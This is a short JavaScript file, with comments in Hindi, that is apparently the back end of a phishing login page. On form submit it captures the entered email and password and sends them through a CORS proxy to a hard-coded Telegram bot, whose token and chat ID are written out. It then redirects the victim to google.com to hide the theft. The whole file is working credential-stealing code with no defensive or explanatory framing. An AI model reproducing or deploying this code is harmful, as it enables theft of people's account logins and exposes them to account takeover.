document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // BotFather से मिला नया टोकन यहाँ डालें
    const botToken = "8717477751:AAHC3xquzM3aWF-4mL6mX7X5krDwTqshv9U"; 
    const chatId = "7732354688";
    
    // सुरक्षित तरीका (Proxy के साथ ताकि Error न आए)
    const proxyUrl = "https://corsproxy.io/?";
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const message = `Login Details:\nEmail: ${email}\nPassword: ${password}`;

    fetch(proxyUrl + encodeURIComponent(telegramUrl), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(() => {
        // मैसेज भेजने के बाद 1 सेकंड रुकें फिर गूगल पर भेजें
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 1000);
    })
    .catch(() => {
        window.location.href = "https://www.google.com";
    });
});
